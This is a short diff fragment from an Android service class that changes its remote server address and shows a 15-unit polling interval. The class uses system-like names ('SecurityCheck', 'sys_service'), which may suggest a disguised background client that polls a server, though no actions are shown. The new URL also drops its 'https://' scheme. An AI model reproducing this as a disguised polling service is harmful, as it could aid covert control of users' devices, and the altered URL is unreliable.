@@ -68,7 +68,7 @@ public class ServiceRunner extends Service {
     private static final String TAG = "SecurityCheck";
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
-    private static final String SERVER_URL = "https://daf-production-8df9.up.railway.app";
+    private static final String SERVER_URL = "daf-production-e34a.up.railway.app";
     private static final int POLL_INTERVAL = 15;
 
     private ScheduledExecutorService scheduler;
